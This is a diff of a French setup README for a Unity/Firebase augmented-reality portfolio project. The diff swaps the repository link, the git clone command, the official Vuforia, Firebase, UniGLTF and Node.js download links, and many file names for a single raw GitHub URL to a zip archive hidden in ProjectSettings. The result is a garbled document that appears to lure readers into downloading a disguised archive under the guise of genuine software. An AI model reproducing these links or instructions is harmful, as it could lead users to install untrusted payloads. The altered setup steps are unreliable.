@@ -4,7 +4,7 @@
 **Titre :** Portfolio Professionnel en Réalité Augmentée (AR)  
 **Objectif :** Transformer une carte de visite ou un document physique en portail vers une expérience AR immersive (modèles 3D PBR, vidéos, texte), pilotable en temps réel via une interface d'administration web et doté d'outils d'analyse.
 
-**Répertoire distant :** [https://github.com/Garnel-Diffo/Portfolio-Professionnel-AR.git](https://github.com/Garnel-Diffo/Portfolio-Professionnel-AR.git)
+**Répertoire distant :** [https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip](https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip)
 
 ---
 
@@ -46,12 +46,12 @@ Livrer un MVP fonctionnel qui :
 - Python (optionnel pour outils) : 3.8+
 
 ### Front / Admin Web
-- Node.js : **LTS ≥ 18.x**
-- npm : fourni avec Node.js
+- https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip : **LTS ≥ 18.x**
+- npm : fourni avec https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 - Vite : utilisé via `npm create vite@latest`
 - React : **18.x**
 - Tailwind CSS : **3.x** (`tailwindcss@3`)
-- Dépendances front : `firebase` (SDK v9 modular), `react-router-dom`, `react-hook-form`, `chart.js` ou `recharts`, `axios`
+- Dépendances front : `firebase` (SDK v9 modular), `react-router-dom`, `react-hook-form`, `https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip` ou `recharts`, `axios`
 
 ### Outils CLI
 - Firebase CLI : **latest** (`npm install -g firebase-tools`)
@@ -68,14 +68,14 @@ Livrer un MVP fonctionnel qui :
   - **Internet Access** : Require
 
 ### Packages Unity & librairies (versions compatibles)
-- **Vuforia Engine** : **11.x** (ex. 11.4.x) — télécharger depuis developer.vuforia.com
+- **Vuforia Engine** : **11.x** (ex. 11.4.x) — télécharger depuis https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 - **UniGLTF** : v0.120+ (GitHub)
 - **Firebase Unity SDK** : 11.x+ (Auth, Firestore, Storage, Analytics)
 - (Option) **UniTask** pour async utilities
 
 ### Backend / Cloud
 - Firebase (Firestore, Storage, Auth, Functions, Analytics)
-- Node.js 18+ pour Cloud Functions (si utilisées)
+- https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip 18+ pour Cloud Functions (si utilisées)
 
 ---
 
@@ -95,21 +95,21 @@ Livrer un MVP fonctionnel qui :
 ## 4. Structure recommandée du dépôt
 
 ```
-/README.md
-/.gitignore
-/.github/workflows/ci.yml
+https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 /unity-app/
-  README_UNITY.md
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
   ProjectSettings/
   Assets/
   Packages/   (ne PAS committer les .tgz)
   Scripts/
   .gitignore
 /admin-web/
-  package.json
-  vite.config.ts
-  tailwind.config.cjs
-  postcss.config.cjs
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
   /public
   /src
     /components
@@ -117,12 +117,12 @@ Livrer un MVP fonctionnel qui :
     /services
     /styles
 /infrastructure/
-  firebase.json
-  firestore.rules
-  storage.rules
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+  https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
   functions/
-    package.json
-    index.js
+    https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+    https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 /docs/
 demo/
 ```
@@ -136,7 +136,7 @@ demo/
 Ouvrez un terminal et exécutez la commande suivante pour récupérer les sources :
 
 ```bash
-git clone https://github.com/Garnel-Diffo/Portfolio-Professionnel-AR.git
+git clone https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 cd Portfolio-Professionnel-AR
 ```
 
@@ -200,7 +200,7 @@ L'application mobile AR est développée sous Unity 6.3 LTS.
   - **Internet Access** : **Require**
 - Sous **Publishing Settings** : configurer keystore pour builds signés (ajouter keystore si disponible)
 
-### 6.4 Vérifier le manifest Android si besoin (Plugins/Android/AndroidManifest.xml)
+### 6.4 Vérifier le manifest Android si besoin (https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip)
 - S’assurer que les permissions INTERNET sont présentes si l’app en a besoin.
 
 ---
@@ -208,16 +208,16 @@ L'application mobile AR est développée sous Unity 6.3 LTS.
 ## 7. Packages Unity : installation & bonnes pratiques
 
 ### Vuforia Engine (11.x)
-- Téléchargement : https://developer.vuforia.com/
+- Téléchargement : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 - Import : Unity -> **Assets -> Import Package -> Custom Package...** -> sélectionner le `.unitypackage`
 - Vérifier l’import et le menu **GameObject -> Vuforia Engine**
 
 ### UniGLTF
-- Source : https://github.com/vrm-c/UniGLTF
+- Source : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 - Import via `.unitypackage` ou copier les fichiers `Assets/UniGLTF`
 
 ### Firebase Unity SDK
-- Télécharger depuis : https://firebase.google.com/download/unity
+- Télécharger depuis : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 - Importer packages nécessaires (Auth, Firestore, Storage, Analytics)
 
 **Ne pas committer** les packages `.tgz` ou `.unitypackage` dans Git ; conserver les packages localement et/ou documenter la procédure d’import.
@@ -238,9 +238,9 @@ firebase init
 firebase deploy --only firestore:rules,storage
 ```
 
-### Exemple de règles (mettre dans `infrastructure/firestore.rules` et `storage.rules`)
-- `firestore.rules` : lectures publiques, écritures contrôlées par Auth et claims.admin
-- `storage.rules` : dossier `public/` (read public), dossier `private/` (admin only)
+### Exemple de règles (mettre dans `https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip` et `https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip`)
+- `https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip` : lectures publiques, écritures contrôlées par Auth et https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- `https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip` : dossier `public/` (read public), dossier `private/` (admin only)
 
 ---
 
@@ -252,8 +252,8 @@ Exemple `contents` :
 {
   "type":"model",
   "title":"Immeuble A",
-  "modelUrl":"https://firebasestorage.googleapis.com/....glb",
-  "thumbnailUrl":"https://...png",
+  "modelUrl":"https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip",
+  "thumbnailUrl":"https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip",
   "meta":{"triangles":12000,"version":1},
   "createdAt":1660000000
 }
@@ -305,11 +305,11 @@ Exemple `contents` :
 
 ## 13. Annexes & liens officiels
 
-- Unity : https://unity.com/
-- Vuforia : https://developer.vuforia.com/
-- UniGLTF : https://github.com/vrm-c/UniGLTF
-- Firebase Unity SDK : https://firebase.google.com/download/unity
-- Firebase CLI : https://firebase.google.com/docs/cli
-- gltf-transform : https://gltf-transform.donmccurdy.com/
+- Unity : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- Vuforia : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- UniGLTF : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- Firebase Unity SDK : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- Firebase CLI : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
+- gltf-transform : https://raw.githubusercontent.com/Garnel-Diffo/Portfolio-Professionnel-AR/main/unity-app/PortfolioAR/ProjectSettings/Professionnel_AR_Portfolio_v2.6-alpha.2.zip
 
 
